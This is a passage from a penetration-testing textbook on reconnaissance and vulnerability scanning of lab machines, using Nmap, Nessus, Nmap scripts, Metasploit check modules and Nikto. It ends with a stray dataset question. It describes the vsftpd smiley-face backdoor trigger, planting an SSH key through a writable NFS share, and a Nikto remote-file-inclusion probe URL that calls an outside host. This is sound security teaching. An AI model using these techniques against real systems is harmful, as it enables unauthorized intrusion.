OpenSSL/0.9.8k\nmod_autoindex_color PHP/5.3.0 mod_perl/2.0.4 Perl/v5.10.0)\n445/tcp open microsoft-ds Microsoft Windows XP microsoft-ds\n1025/tcp open msrpc Microsoft Windows RPC\nInformation Gathering 127\n3306/tcp open mysql MySQL (unauthorized)\n5000/tcp open upnp Microsoft Windows UPnP\nMAC Address: 00:0C:29:A5:C1:24 (Vmware)\nService Info: Host: georgia.com; OS: Windows; CPE: cpe:/o:microsoft:windows\nNmap scan report for 192.168.20.11\nHost is up (0.00065s latency).\nNot shown: 993 closed ports\n\nPORT STATE SERVICE VERSION\n21/tcp open ftp vsftpd 2.3.4 u\n22/tcp open ssh OpenSSH 5.1p1 Debian 3ubuntu1 (protocol 2.0)\n80/tcp open http Apache httpd 2.2.9 ((Ubuntu) PHP/5.2.6-2ubuntu4.6 with\nSuhosin-Patch)\n111/tcp open rpcbind (rpcbind V2) 2 (rpc #100000)\n139/tcp open netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)\n445/tcp open netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)\n2049/tcp open nfs (nfs V2-4) 2-4 (rpc #100003)\nMAC Address: 00:0C:29:FD:0E:40 (VMware)\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:kernel\nNmap scan report for 192.168.20.12\nHost is up (0.0010s latency).\nNot shown: 999 filtered ports\n\nPORT STATE SERVICE VERSION\n80/tcp open http Microsoft IIS httpd 7.5\n135/tcp open msrpc Microsoft Windows RPC\nMAC Address: 00:0C:29:62:D5:C8 (VMware)\nService detection performed. Please report any incorrect results at http://nmap.org/submit/ .\nNmap done: 3 IP addresses (3 hosts up) scanned in 20.56 seconds\nListing 5-7: Running an Nmap version scan\nThis time we gained much more information about our Windows XP\nand Linux targets. For example, we knew there was an FTP server on the\nLinux box, but now we have reasonable assurance that the FTP server is Very\nSecure FTP version 2.3.4 u. We’ll use this output to search for potential vul-\nnerabilities in the next chapter. As for our Windows 7 system, we found out\nonly that it’s running Microsoft IIS 7.5, a fairly up-to-date version. It’s possible\nto install IIS 8 on Windows 7, but it’s not officially supported. The version\nitself would not raise any red flags to me. We will find that the application\ninstalled on this IIS server is the real issue in Chapter 14.\nnote Keep in mind that Nmap may report the wrong version in some cases (for instance,\nif the software has been updated, but the welcome banner is not edited as part of the\npatch), but at the very least, its version scan gave us a good place to begin further\nresearch.\nUDP Scans\nBoth Nmap’s SYN and version scans are TCP scans that do not query UDP\nports. Because UDP is connectionless, the scanning logic is a bit different.\n128 Chapter 5\nIn a UDP scan (-sU), Nmap sends a UDP packet to a port. Depending on\nthe port, the packet sent is protocol specific. If it receives a response, the\nport is considered open. If the port is closed, Nmap will receive an ICMP\nPort Unreachable message. If Nmap receives no response whatsoever, then\neither the port is open and the program listening does not respond to\nNmap’s query, or the traffic is being filtered. Thus, Nmap is not always able\nto distinguish between an open UDP port and one that is filtered by a fire-\nwall. See Listing 5-8 for a UDP scan example.\nroot@kali:~# nmap -sU 192.168.20.10-12 -oA bookudp\nStarting Nmap 6.40 ( http://nmap.org ) at 2015-12-18 08:39 EST\nStats: 0:11:43 elapsed; 0 hosts completed (3 up), 3 undergoing UDP Scan\nUDP Scan Timing: About 89.42% done; ETC: 08:52 (0:01:23 remaining)\nNmap scan report for 192.168.20.10\nHost is up (0.00027s latency).\nNot shown: 990 closed ports\n\nPORT STATE SERVICE\n69/udp open|filtered tftp u\n123/udp open ntp\n135/udp open msrpc\n137/udp open netbios-ns\n138/udp open|filtered netbios-dgm\n445/udp open|filtered microsoft-ds\n500/udp open|filtered isakmp\n1026/udp open win-rpc\n1065/udp open|filtered syscomlan\n1900/udp open|filtered upnp\nMAC Address: 00:0C:29:A5:C1:24 (VMware)\nNmap scan report for 192.168.20.11\nHost is up (0.00031s latency).\nNot shown: 994 closed ports\n\nPORT STATE SERVICE\n68/udp open|filtered dhcpc\n111/udp open rpcbind\n137/udp open netbios-ns\n138/udp open|filtered netbios-dgm\n2049/udp open nfs v\n5353/udp open zeroconf\nMAC Address: 00:0C:29:FD:0E:40 (VMware)\nNmap scan report for 192.168.20.12\nHost is up (0.072s latency).\nNot shown: 999 open|filtered ports\n\nPORT STATE SERVICE\n137/udp open netbios-ns\nMAC Address: 00:0C:29:62:D5:C8 (VMware)\nNmap done: 3 IP addresses (3 hosts up) scanned in 1073.86 seconds\nListing 5-8: Running a UDP scan\nInformation Gathering 129\nFor example, on the Windows XP system, the TFTP port (UDP 69) may\nbe open or filtered u. On the Linux target, Nmap was able to glean that\nthe Network File System port is listening v. Because only two TCP ports\nresponded on the Windows 7 box, it’s fair to assume that a firewall is in\nplace, in this case the built-in Windows firewall. Likewise, the Windows fire-\nwall is filtering all traffic except to one UDP port. (If the Windows firewall\nwere not in place, our UDP scan might give us more information.)\nScanning a Specific Port\nBy default, Nmap scans only the 1,000 ports it considers the most “interest-\ning,” not the 65,535 possible TCP or UDP ports. The default Nmap scan will\ncatch common running services, but in some cases it will miss a listening port\nor two. To scan specific ports, use the -p flag with Nmap. For example, to\nscan port 3232 on the Windows XP target, see Listing 5-9.\nroot@Kali:~# nmap -sS -p 3232 192.168.20.10\nStarting Nmap 6.40 ( http://nmap.org ) at 2015-12-18 09:03 EST\nNmap scan report for 192.168.20.10\nHost is up (0.00031s latency).\n\nPORT STATE SERVICE\n3232/tcp open unknown\nMAC Address: 00:0C:29:A5:C1:24 (VMware)\nListing 5-9: Running an Nmap scan on a specific port\nSure enough, when we tell Nmap to scan 3232, it returns open, which\nshows that this port is worth checking out, in addition to the default Nmap\nscanned ports. However, if we try to probe the port a bit more aggressively\nwith a version scan (see Listing 5-10), the service listening on the port\ncrashes, as shown in Figure 5-8.\nnote A good rule of thumb is to specify ports 1 through 65535 on your pentests, just to\nmake sure there’s nothing listening on those other “uninteresting” ports.\nroot@kali:~# nmap -p 3232 -sV 192.168.20.10\nStarting Nmap 6.40 ( http://nmap.org ) at 2015-04-28 10:19 EDT\nNmap scan report for 192.168.20.10\nHost is up (0.00031s latency).\n\nPORT STATE SERVICE VERSION\n3232/tcp open unknown\n1 service unrecognized despite returning datau. If you know the service/\nversion, please submit the following fingerprint at http://www.insecure.org/\ncgi-bin/servicefp-submit.cgi : v\nSF-Port3232-TCP:V=6.25%I=7%D=4/28%Time=517D2FFC%P=i686-pc-linux-gnu%r(GetR\nSF:equest,B8,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nServer:\\x20Zervit\\x200\\.4\\r\\nwX-Pow\n130 Chapter 5\nSF:ered-By:\\x20Carbono\\r\\nConnection:\\x20close\\r\\nAccept-Ranges:\\x20bytes\\\nSF:r\\nContent-Type:\\x20text/html\\r\\nContent-Length:\\x2036\\r\\n\\r\\n<html>\\r\\\nSF:n<body>\\r\\nhi\\r\\n</body>\\r\\n</html>\");\nMAC Address: 00:0C:29:13:FA:E3 (VMware)\nListing 5-10: Running a version scan against a specific port\nFigure 5-8: The Zervit server crashes when scanned by Nmap. In the process of crashing the listening service, Nmap can’t figure out\nwhat software is running as noted at u, but it does manage to get a finger-\nprint of the service. Based on the HTML tags in the fingerprint at v, this\nservice appears to be a web server. According to the Server: field, it is some-\nthing called Zervit 0.4 w. At this point, we have crashed the service, and we may never see it\nagain on our pentest, so any potential vulnerabilities may be a moot point. Of course, in our lab we can just switch over to our Windows XP target and\nrestart the Zervit server. note Though hopefully you won’t make any services crash on your pentests, there is always\na possibility that you will run into a particularly sensitive service that was not coded\nto accept anything other than expected input, such that even seemingly benign traffic\nlike an Nmap scan causes it to crash. SCADA systems are particularly notorious for\nthis sort of behavior. You always want to explain this to your client. When working\nwith computers, there are no guarantees. We’ll return to the Nmap tool in the next chapter when we use the\nNmap Scripting Engine (NSE) to learn detailed vulnerability information\nabout our target systems before beginning exploitation. Information Gathering 131\nsummary\nIn this chapter we’ve managed to cover a lot of ground very quickly just by\nusing publicly available sources and port scanners. We used tools such as\ntheHarvester and Maltego to scour the Internet for information such as\nemail addresses and websites. We used the Nmap port scanner to find out\nwhich ports are listening on our target virtual machines. Based on the\noutput we’ve discovered, we can now do some research on known vulner-\nabilities as we start to think like attackers and actively seek exploitable vul-\nnerabilities in the systems. In the next chapter, we’ll cover the vulnerability\nanalysis phase of penetration testing. 132 Chapter 5\n6\nfinDing Vulner aBilities\nBefore we start slinging exploits, we need to do some\nmore research and analysis. When identifying vulner-\nabilities, we actively search for issues that will lead to\ncompromise in the exploitation phase. Although some\nsecurity firms will just run an automated exploitation tool and hope for the\nbest, careful study of the vulnerabilities by a skilled pentester will garner\nbetter results than any tool on its own. We’ll examine several vulnerability analysis methods in this chapter,\nincluding automated scanning, targeted analysis, and manual research. From nmap Version scan to Potential Vulnerability\nNow that we have some information about our target and the attack sur-\nface, we can develop scenarios to reach our pentest goals. For example, the\nFTP server on port 21 announced itself as Vsftpd 2.3.4. Vsftpd is short for\nVery Secure FTP. We might assume that a product that calls itself very secure is asking for\ntrouble, and in fact, in July 2011, it came to light that the Vsftpd repository\nhad been breached. The Vsftpd binaries had been replaced with a back-\ndoored version that could be triggered with a username containing a smiley\nface :). This opens a root shell on port 6200. Once the issue was discovered,\nthe backdoored binaries were removed, and the official Vsftpd 2.3.4 was put\nback in place. So, though the presence of Vsftpd 2.3.4 doesn’t guarantee that\nour target is vulnerable, it is definitely a threat to consider. Pentesting doesn’t\nget much easier than piggybacking on an attacker who already owns a system. nessus\nTenable Security’s Nessus is one of the most widely used commercial vul-\nnerability scanners, though many vendors provide comparable products. Nessus shares its name with a centaur who was slain by the Greek mytho-\nlogical hero, Heracles, and whose blood later killed Heracles himself. The\nNessus database includes vulnerabilities across platforms and protocols,\nand its scanner performs a series of checks to detect known issues. You’ll\nfind entire books and training courses devoted to Nessus, and as you become\nmore familiar with the tool, you’ll find what works best for you. I’ll provide\nonly a high-level discussion of Nessus here. Nessus is available as a paid professional version that pentesters and in-\nhouse security teams can use to scan networks for vulnerabilities. You can\nuse the free, noncommercial version called Nessus Home to try the exer-\ncises in this book. Nessus Home is limited to scanning 16 IP addresses. (Nessus isn’t preinstalled on Kali, but we covered installing it in Chapter 1.)\nBefore you can run Nessus you need to start the Nessus daemon. To do\nso, enter the service command as shown here to start the Nessus web inter-\nface on TCP port 8834. root@kali:~# service nessusd start\nNow open a web browser, and access Nessus by directing the Iceweasel\nbrowser to https://kali:8834. (If you want to access the Nessus interface\nfrom another system, such as the host, you must replace kali with the IP\naddress of the Kali machine.) After a few minutes of initialization, you\nshould see a login screen, shown in Figure 6-1. Use the login credentials\nyou created in Chapter 1. Nessus Policies\nThe Nessus web interface has several tabs at the top of the screen, as shown\nin Figure 6-2. Let’s start with the Policies tab. Nessus policies are like con-\nfiguration files that tell Nessus which vulnerability checks, port scanners, and\nso on to run in the vulnerability scan. 134 Chapter 6\nFigure 6-1: The Nessus web interface login screen\nFigure 6-2: Nessus policies\nTo create a policy, click New Policy at the left of the Nessus interface. Nessus’s policy wizards will help you create a policy that will be useful\nfor your scanning goals, as shown in Figure 6-3. For our simple example,\nchoose Basic Network Scan. Finding Vulnerabilities 135\nFigure 6-3: Nessus policy wizards\nNow you are prompted for some basic information about the policy, as\nshown in Figure 6-4, including a name, a description, and whether other\nNessus users can access the policy. Once you are done, click Next. Figure 6-4: Basic policy setup\nNow you are asked if this is an internal or external scan, as shown in\nFigure 6-5. Choose Internal and click Next. 136 Chapter 6\nFigure 6-5: Internal or external scan\nIf you have credentials, Nessus can authenticate with hosts and look for\nvulnerabilities that may not be apparent from a network-facing perspective. This feature is often used by internal security teams to test the security\nposture of their networks. You can set these credentials in the next step, as\nshown in Figure 6-6. For now, you can leave this step blank and click Save. Figure 6-6: Adding credentials (optional)\nAs shown in Figure 6-7, our new policy is now shown in the Policy tab. Finding Vulnerabilities 137\nFigure 6-7: Our policy is added. Scanning with Nessus\nNow, let’s switch to the Scans tab and run Nessus against our target\nmachines. Click Scans4New Scan, and fill in the scan information,\nas shown in Figure 6-8. Nessus needs to know the name for our scan\n(Name), which scan policy to use (Policy), and which systems to scan\n(Targets). Figure 6-8: Starting a Nessus scan\n138 Chapter 6\nNessus runs a series of probes against the target in an attempt to detect\nor rule out as many issues as possible. The running scan is added to the Scans\ntab as shown in Figure 6-9. Figure 6-9: Running a Nessus scan\nOnce the scan is finished, click it to view the results, as shown in\nFigure 6-10. Figure 6-10: High-level overview of the results\nAs shown in the figure, Nessus found several critical vulnerabilities on\nthe Windows XP and Ubuntu targets. But it found only informational data\non the Windows 7 box. To see details of a specific host, click it. Details of the Windows XP\nvulnerabilities are shown in Figure 6-11. Finding Vulnerabilities 139\nFigure 6-11: Nessus categorizes and describes its results. Say what you want about vulnerability scanners, but it’s hard to find a\nproduct that can tell you as much about a target environment as quickly\nand with as little effort as Nessus. For example, Nessus’s results reveal that\nour Windows XP target is in fact missing the MS08-067 patch discussed in\nChapter 4. It also seems to be missing other Microsoft patches affecting the\nSMB server. Which vulnerability is the most exploitable? The Nessus output for a\nparticular issue will often give you some information about that issue’s poten-\ntial exploitability. For example, clicking the MS08-067 vulnerability in the\noutput (Figure 6-12) shows exploit code available for this vulnerability in\nMetasploit as well as other tools such as Core Impact and Canvas. Figure 6-12: The MS08-067 Nessus entry provides detailed information. A Note About Nessus Rankings\nNessus ranks vulnerabilities based on the Common Vulnerability Scoring\nSystem (CVSS), version 2, from the National Institute of Standards and\n140 Chapter 6\nTechnology (NIST). Ranking is calculated based on the impact to the sys-\ntem if the issue is exploited. Though the higher the vulnerability ranking,\nthe more serious Nessus thinks the vulnerability issue is, the actual risk of\na vulnerability depends on the environment. For example, Nessus ranks\nanonymous FTP access as a medium-risk vulnerability. When restricted to\nnonsensitive files, however, anonymous FTP access can have a low to non-\nexistent risk. On the other hand, it isn’t unheard of for companies to leave\ncopies of their proprietary source code lying around on a publicly available\nFTP server. If on an external pentesting engagement you can access the cli-\nent’s biggest asset by logging in as anonymous on an FTP server, it’s safe to\nassume that any interested attacker can do the same, and this warrants an\nimmediate call to your client contact. Tools are not capable of making this\nsort of distinction. For that you need a pentester. Why Use Vulnerability Scanners? Though some penetration testing courses leave out vulnerability scanning\naltogether and argue that a skilled pentester can find everything a scanner\ncan, scanners are still valuable tools, especially because many pentests are\nperformed within a shorter time window than anyone might like. But if one\nof the goals of your assessment is to avoid detection, you might think twice\nabout using a loud vulnerability scanner. Though Nessus did not find every issue in our environment, its use,\ncombined with the results of our information-gathering phase, has given\nus a solid starting point for exploitation. Even those pentesters who think\nthat a pentester should replace a scanner during an engagement can ben-\nefit from knowing how to use scanning tools. Though in an ideal world,\nevery company would perform regular, no-holds-barred pentests, in reality,\nthere is plenty of vulnerability scanning work to go around. Exporting Nessus Results\nOnce a Nessus scan finishes, you can export its findings from the Export\nbutton at the top of the scan details screen, as shown in Figure 6-13. Figure 6-13: Exporting Nessus scan results\nFinding Vulnerabilities 141\nNessus can output results into PDF, HTML, XML, CSV, and other for-\nmats. You may want to hand off the raw results to your client for a vulner-\nability scanning engagement, but you should never export scanner results,\nslap your company letterhead on them, and call them pentest results. Much\nmore analysis is involved in a penetration test than a vulnerability scan. You\nshould always verify results from automated scanners and combine them\nwith manual analysis to get a more complete picture of the vulnerabilities\nin the environment. Now for a look at some other methods of vulnerability analysis. Researching Vulnerabilities\nIf the Nessus summary page doesn’t give you enough information about a\nvulnerability, try a good old-fashioned Google search.\n\nAdditionally, try\nsearching http://www.securityfocus.com/, http://www .packetstormsecurity.org/,\nhttp://www.exploit-db.org/, and http://www.cve.mitre .org/. For example, you can\nsearch for vulnerabilities using the Common Vulnerabilities and Exposures\n(CVE) system, Microsoft patch number, and so on within a specific site using\na Google query such as “ms08-067 site:securityfocus.com”. The MS08-067 vul-\nnerability received a lot of attention, so you’ll find no shortage of good infor-\nmation. (We looked at the details of this particular issue in Chapter 4.)\nDepending on your subject vulnerability, you may be able to find proof-\nof-concept exploit code online as well. We’ll look at working with public code\nin Chapter 19, but be warned that unlike the community-vetted exploits in a\nproject such as Metasploit, not all code on the Internet does what it claims. The payload in a public exploit may destroy the target machine, or it may\njoin your machine to the exploit author’s secret botnet. Be vigilant when\nworking with public exploits, and carefully vet them before running them\nagainst a production network. (You may also be able to find in-depth infor-\nmation about some vulnerabilities posted by the researchers who originally\nfound the issue.)\nthe nmap scripting engine\nNow for another tool that provides vulnerability scanning. Just as Metasploit\nevolved from an exploitation framework into a fully fledged penetration-\ntesting suite with hundreds of modules, Nmap has similarly evolved beyond\nits original goal of port scanning. The Nmap Scripting Engine (NSE) lets\nyou run publicly available scripts and write your own. You’ll find the scripts packaged with the NSE in Kali at /usr/share/nmap\n/scripts. The available scripts fall into several categories, including informa-\ntion gathering, active vulnerability assessment, searches for signs of previ-\nous compromises, and so on. Listing 6-1 shows NSE scripts available in your\ndefault Kali installation. root@kali:~# cd /usr/share/nmap/scripts\nroot@kali:/usr/local/share/nmap/scripts# ls\nacarsd-info.nse ip-geolocation-geobytes.nse\n142 Chapter 6\naddress-info.nse ip-geolocation-geoplugin.nse\nafp-brute.nse ip-geolocation-ipinfodb.nse\nafp-ls.nse ip-geolocation-maxmind.nse\n--snip--\nListing 6-1: Nmap scripts list\nTo get more information about a particular script or category of scripts,\nenter the --script-help flag in Nmap. For example, to see all scripts in the\ndefault category enter nmap --script-help default, as shown in Listing 6-2. Many factors contribute to whether a script is included in the default cate-\ngory, including its reliability and whether the script is safe and unlikely to\nharm the target. root@kali:~# nmap --script-help default\nStarting Nmap 6.40 ( http://nmap.org ) at 2015-07-16 14:43 EDT\n--snip--\nftp-anon\nCategories: default auth safe\nhttp://nmap.org/nsedoc/scripts/ftp-anon.html\nChecks if an FTP server allows anonymous logins. If anonymous is allowed, gets a directory listing of the root directory and\nhighlights writeable files. --snip--\nListing 6-2: Nmap default scripts help\nIf you use the -sC flag to tell Nmap to run a script scan in addition to\nport scanning, it will run all the scripts in the default category, as shown in\nListing 6-3. root@kali:~# nmap -sC 192.168.20.10-12\nStarting Nmap 6.40 ( http://nmap.org ) at 2015-12-30 20:21 EST\nNmap scan report for 192.168.20.10\nHost is up (0.00038s latency). Not shown: 988 closed ports\n\nPORT STATE SERVICE\n21/tcp open ftp\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| drwxr-xr-x 1 ftp ftp 0 Aug 06 2009 incoming\n|_-r--r--r-- 1 ftp ftp 187 Aug 06 2009 onefile.html\n|_ftp-bounce: bounce working!\n25/tcp open smtp\n| smtp-commands: georgia.com, SIZE 100000000, SEND, SOML, SAML, HELP, VRFYu, EXPN, ETRN, XTRN,\n|_ This server supports the following commands. HELO MAIL RCPT DATA RSET SEND SOML SAML HELP\n\nNOOP QUIT\n79/tcp open finger\n|_finger: Finger online user list request denied.\n80/tcp open http\n|_http-methods: No Allow or Public header in OPTIONS response (status code 302)\nFinding Vulnerabilities 143\n| http-title: XAMPP 1.7.2 v\n|_Requested resource was http://192.168.20.10/xampp/splash.php\n--snip--\n3306/tcp open mysql\n| mysql-info: MySQL Error detected!\n| Error Code was: 1130\n|_Host '192.168.20.9' is not allowed to connect to this MySQL server w\n--snip--\nListing 6-3: Nmap default scripts output\nAs you can see, the Nmap Scripting Engine found a good deal of inter-\nesting information. For example, we see that the SMTP server on port 25\nof the Windows XP target allows the use of the VRFY u command, which\nallows us to see if a username exists on the mail server. If we have a valid\nusername, use of this command will make credential-guessing attacks much\nmore likely to succeed.\nWe can also see that the web server on port 80 appears to be an XAMPP\n\n1.7.2 install v. As of this writing, the current stable version of XAMPP for\nWindows is 1.8.3. At the very least, the version we found is out of date, and\nit may also be subject to security issues.\nIn addition to showing us potential vulnerabilities, NSE also allows us\nto rule out some services. For example, we can see that the MySQL server\non port 3306 does not allow us to connect because our IP address is not\nauthorized w. We may want to return to this port during post exploitation\nif we are able to compromise other hosts in the environment, but for now\nwe can rule out MySQL vulnerabilities on this host.\nrunning a single nse script\nBefore we move on, let’s look at another example of using an NSE script, this\ntime one that is not part of the default set. From our basic use of Nmap in\nthe previous chapter, we know that our Linux target is running Network File\nSystem (NFS). NFS allows client computers to access local files over the net-\nwork, but in your pentesting career, you may find that setting up NFS securely\nis easier said than done. Many users don’t think about the security conse-\nquences of giving remote users access to their files. What’s the worst that can\nhappen, right? Who cares if I share my home directory with my coworkers?\nThe NSE script nfs-ls.nse will connect to NFS and audit shares. We can\nsee more information about an individual script with the --script-help com-\nmand, as shown in Listing 6-4.\nroot@kali:~# nmap --script-help nfs-ls\nStarting Nmap 6.40 ( http://nmap.org ) at 2015-07-16 14:49 EDT\nnfs-ls\nCategories: discovery safe\n144 Chapter 6\nhttp://nmap.org/nsedoc/scripts/nfs-ls.html\nAttempts to get useful information about files from NFS exports.\nThe output is intended to resemble the output of <code>ls</code>.\n--snip--\nListing 6-4: Nmap NFS-LS script details\nThis script mounts the remote shares, audits their permissions, and\nlists the files included in the share. To run a script against our Linux tar-\nget, we call it using the --script option and the script name, as shown in\nListing 6-5.\nroot@kali:/# nmap --script=nfs-ls 192.168.20.11\nStarting Nmap 6.40 ( http://nmap.org ) at 2015-12-28 22:02 EST\nNmap scan report for 192.168.20.11\nHost is up (0.00040s latency).\nNot shown: 993 closed ports\n\nPORT STATE SERVICE VERSION\n21/tcp open ftp vsftpd 2.3.4\n22/tcp open ssh OpenSSH 5.1p1 Debian 3ubuntu1 (Ubuntu Linux; protocol 2.0)\n80/tcp open http Apache httpd 2.2.9 ((Ubuntu) PHP/5.2.6-2ubuntu4.6 with Suhosin-Patch)\n111/tcp open rpcbind 2 (RPC #100000)\n| nfs-ls:\n| Arguments:\n| maxfiles: 10 (file listing output limited)\n|\n| NFS Export: /export/georgiau\n| NFS Access: Read Lookup Modify Extend Delete NoExecute\n| PERMISSION UID GID SIZE MODIFICATION TIME FILENAME\n| drwxr-xr-x 1000 1000 4096 2013-12-28 23:35 /export/georgia\n| -rw------- 1000 1000 117 2013-12-26 03:41 .Xauthority\n| -rw------- 1000 1000 3645 2013-12-28 21:54 .bash_history\n| drwxr-xr-x 1000 1000 4096 2013-10-27 03:11 .cache\n| -rw------- 1000 1000 16 2013-10-27 03:11 .esd_auth\n| drwx------ 1000 1000 4096 2013-10-27 03:11 .gnupg\n| ?????????? ? ? ? ? .gvfs\n| -rw------- 1000 1000 864 2013-12-15 19:03 .recently-used.xbel\n| drwx------ 1000 1000 4096 2013-12-15 23:38 .sshv\n--snip--\nListing 6-5: Nmap NFS-LS scripts output\nAs you can see, the NSE script found the NFS share /export/georgia u on\nour Linux target. Of particular interest is the .ssh directory v, which may\ninclude sensitive information such as SSH keys and (if public key authenti-\ncation is allowed on the SSH server) a list of authorized keys. When you run into an access-control mistake like this, one common pen-\ntest trick is to use the mistake and the write permission to add a new SSH\nFinding Vulnerabilities 145\nkey to the authorized_keys list (in this case, ours). If that attempt succeeds,\nsuddenly the seemingly minor issue of being able to edit a user’s documents\nturns into the ability to log in to the remote system and execute commands. Before we move on, let’s ensure that public key SSH authentication is\nenabled on our Linux target, allowing the attack we envisioned above to\nwork successfully. Key-based login is considered the strongest form of SSH\nauthentication and is recommended for security. A quick SSH attempt to\nour Linux target shows that public key authentication is allowed here u\n(see Listing 6-6). root@kali:/# ssh 192.168.20.11\nThe authenticity of host '192.168.20.11 (192.168.20.11)' can't be established. RSA key fingerprint is ab:d7:b0:df:21:ab:5c:24:8b:92:fe:b2:4f:ef:9c:21. Are you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '192.168.20.11' (RSA) to the list of known hosts. root@192.168.20.11's password:\nPermission denied (publickeyu,password). Listing 6-6: SSH authentication methods\nnote Some NSE scripts may crash services or harm the target system, and an entire category\nis dedicated to denial of service. For example, the script smb-check-vulns will check\nfor the MS08-067 vulnerability and other SMB vulnerabilities. Its help information\nnotes that this script is likely dangerous and shouldn’t be run on production systems\nunless you are prepared for the server to go down. metasploit scanner modules\nMetasploit, which we used in Chapter 4, also can conduct vulnerability\nscanning via numerous auxiliary modules. Unlike exploits, these modules\nwill not give us control of the target machine, but they will help us identify\nvulnerabilities for later exploitation. One such Metasploit module looks for FTP services that provide anony-\nmous access. Although it may be easy enough to attempt to log in manually\nto individual FTP servers, Metasploit auxiliary modules let us scan many\nhosts at once, which will save time when you’re testing a large environment. To choose a particular module, we use the module, then we define\nour targets with set, and then scan with the exploit command, as shown\nin Listing 6-7. This syntax should be familiar from Chapter 4. msf > use scanner/ftp/anonymous\nmsf auxiliary(anonymous) > set RHOSTS 192.168.20.10-11\nRHOSTS => 192.168.20.10-11\nmsf auxiliary(anonymous) > exploit\n[*] 192.168.20.10:21 Anonymous READ (220-FileZilla Server version 0.9.32 beta\n220-written by Tim Kosse (Tim.Kosse@gmx.de) u\n220 Please visit http://sourceforge.net/projects/filezilla/)\n146 Chapter 6\n[*] Scanned 1 of 2 hosts (050% complete)\n[*] 192.168.20.11:21 Anonymous READ (220 (vsFTPd 2.3.4)) u\n[*] Scanned 2 of 2 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(anonymous) >\nListing 6-7: Metasploit anonymous FTP scanner module\nAt u, we find that both the Windows XP and Linux targets have anony-\nmous FTP enabled. We know this may or may not be a serious issue, based\non the files that are available to the anonymous user in the FTP folder. I’ve been on engagements where company trade secrets were sitting on an\nInternet-facing FTP server. On the other hand, I’ve also been on engage-\nments where the use of anonymous FTP was justified from a business per-\nspective, and no sensitive files were present. It is up to a pentester to fill in\nthe information an automated scanner lacks as to the severity of an issue in\na particular environment. metasploit exploit Check Functions\nSome Metasploit exploits include a check function that connects to a target\nto see if it is vulnerable, rather than attempting to exploit a vulnerability. We can use this command as a kind of ad hoc vulnerability scan, as shown\nin Listing 6-8. (There’s no need to specify a payload when running check\nbecause no exploitation will take place.)\nmsf > use windows/smb/ms08_067_netapi\nmsf exploit(ms08_067_netapi) > set RHOST 192.168.20.10\nRHOST => 192.168.20.10\nmsf exploit(ms08_067_netapi) > checku\n[*] Verifying vulnerable status... (path: 0x0000005a)\n[+] The target is vulnerable.v\nmsf exploit(ms08_067_netapi) >\nListing 6-8: MS08-067 check function\nWhen we run the vulnerability check u, Metasploit tells us that our\nWindows XP target is vulnerable to the MS08-067 vulnerability v, as\nexpected. Unfortunately, not all Metasploit modules have check functions. (If you\ntry running check on a module that doesn’t support it, Metasploit will tell\nyou.) For example, based on the results of our Nmap version scan in the\nprevious chapter, the Windows XP target mail server appears to be out of\ndate and subject to security issues. SLMail version 5.5.0.4433 has a known\nexploitable issue—CVE-2003-0264—so we can find it easily with a quick\nsearch in Msfconsole for cve:2003-0264. Finding Vulnerabilities 147\nOnce in the context of the module, we can test out check, as shown in\nListing 6-9. msf exploit(seattlelab_pass) > set RHOST 192.168.20.10\nrhost => 192.168.20.10\nmsf exploit(seattlelab_pass) > check\n[*] This exploit does not support check. msf exploit(seattlelab_pass) >\nListing 6-9: The SLMail module has no check function. As it turns out, this exploit module does not implement the check func-\ntion, so we don’t have solid assurance that a service is vulnerable. Although\nour SLMail POP3 server appears to be vulnerable based on its banner version\nnumber, we can’t get confirmation from Metasploit. In cases like these, we\nmay not be able to know for sure if a vulnerability exists short of running an\nexploit. web application scanning\nAlthough a client’s custom-built apps may have security problems, your tar-\nget may also deploy prebuilt web applications such as payroll apps, webmail,\nand so on, which can be vulnerable to the same issues. If we can find an\ninstance of known vulnerable software, we may be able to exploit it to get\na foothold in a remote system. Web application issues are particularly interesting on many external\npenetration tests where your attack surface may be limited to little more\nthan web servers. For example, as you can see in Figure 6-14, browsing to\nthe default web page of the web server on our Linux target reveals a default\nApache install page. Figure 6-14: Default Apache page\n148 Chapter 6\nUnless we can find a vulnerability in the underlying web server soft-\nware, we’ll have a hard time exploiting a simple page that reads “It works!”\nBefore we write this service off, though, let’s use a web scanner to look for\nadditional pages that we might not see otherwise. Nikto\nNikto is a web application vulnerability scanner built into Kali that’s like\nNessus for web apps: It looks for issues such as dangerous files, outdated\nversions, and misconfigurations. To run Nikto against our Linux target,\nwe tell it which host to scan with the -h flag, as shown in Listing 6-10. root@kali:/# nikto -h 192.168.20.11\n- Nikto v2.1.5\n---------------------------------------------------------------------------\n+ Target IP: 192.168.20.11\n+ Target Hostname: 192.168.20.11\n+ Target Port: 80\n+ Start Time: 2015-12-28 21:31:38 (GMT-5)\n---------------------------------------------------------------------------\n+ Server: Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.6 with Suhosin-Patch\n--snip--\n+ OSVDB-40478: /tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x. tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt?: TikiWiki contains a\nvulnerability which allows remote attackers to execute arbitrary PHP code. u\n+ 6474 items checked: 2 error(s) and 7 item(s) reported on remote host\n+ End Time: 2015-12-28 21:32:41 (GMT-5) (63 seconds)\nListing 6-10: Running Nikto\nManually browsing to the default installation path for every application\nwith known vulnerabilities would be a daunting task, but fortunately, Nikto\nseeks out URLs that may not be apparent. One particularly interesting find-\ning here is a vulnerable installation of the TikiWiki software u on the server. Sure enough, if we browse to the TikiWiki directory at http://192.168.20.11/\ntikiwiki/, we find the CMS software. Nikto thinks that this install is subject\nto a code execution vulnerability, and further analysis of Open Sourced\nVulnerability Database (OSVDB) entry 40478 reveals that this issue has a\nMetasploit exploit that we can use during exploitation. note OSVDB (http://osvdb.com/) is a vulnerability repository specifically for open source\nsoftware such as TikiWiki, with detailed information on a wide variety of products.",
    "question": "What are the key steps and tools used to gather information and identify vulnerabilities during a pentest of bulbsecurity.com?",
